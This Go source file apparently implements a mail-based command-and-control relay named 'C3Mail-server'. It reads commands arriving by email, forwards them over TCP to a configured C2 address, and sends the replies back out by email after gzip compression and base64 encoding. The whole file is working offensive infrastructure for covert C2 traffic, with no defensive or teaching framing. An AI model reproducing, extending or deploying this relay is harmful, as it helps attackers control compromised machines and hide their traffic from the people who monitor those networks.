package main

import (
	"C3Mail-server/mail"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"github.com/go-ini/ini"
	"log"
	"net"
	"time"
)

type Config struct {
	MailConfig mail.MailConfig
	C2Addr     string
}

// 从INI格式的配置文件中加载邮件配置信息
func loadConfig(filename string) (Config, error) {
	var config Config

	// 加载INI格式的配置文件
	cfg, err := ini.Load(filename)
	if err != nil {
		return config, err
	}

	// 解析配置文件中的各项配置
	err = cfg.Section("config").MapTo(&config)
	if err != nil {
		return config, err
	}
	return config, nil
}
func compressAndEncode(data []byte) (string, error) {
	// 使用bytes.Buffer作为中间缓冲区
	var b bytes.Buffer

	// 创建gzip写入器
	gzipWriter := gzip.NewWriter(&b)

	// 写入数据到gzip写入器
	_, err := gzipWriter.Write(data)
	if err != nil {
		return "", err
	}

	// 关闭gzip写入器
	err = gzipWriter.Close()
	if err != nil {
		return "", err
	}

	// 使用base64编码压缩后的数据
	encodedData := base64.StdEncoding.EncodeToString(b.Bytes())

	return encodedData, nil
}
func handleConnection(conn net.Conn, msgCh chan []byte, mailObj *mail.MailConfig) {
	defer conn.Close()
	select {
	case msg := <-msgCh:
		log.Println(string(msg))
		conn.Write(msg)
		buffer := make([]byte, 1024*1024)
		time.Sleep(time.Millisecond * 10)
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
			return
		}
		searchStr := "404 Not Found"
		// 使用判断是否返回的是404
		if !bytes.Contains(buffer, []byte(searchStr)) {
			log.Println(string(buffer[:n]))
			send, err := compressAndEncode(buffer[:n])
			if err != nil {
				return
			}
			mailObj.Send(send)
		}
	default:
		return
	}

}

func main() {
	config, err := loadConfig("config.ini")
	if err != nil {
		log.Panicln("[-] ", err)
	}
	newMailCh := make(chan []byte)
	mailObj := mail.NewMail(config.MailConfig)
	go mailObj.Receive(newMailCh)
	//for {
	//	newMail := <-newMailCh
	//	fmt.Println("New email received:", string(newMail))
	//}
	for {
		conn, err := net.Dial("tcp", config.C2Addr)
		if err != nil {
			fmt.Println("Error connect:", err.Error())
			return
		}
		handleConnection(conn, newMailCh, mailObj)
		time.Sleep(time.Second * config.MailConfig.CheckTime)
	}
}
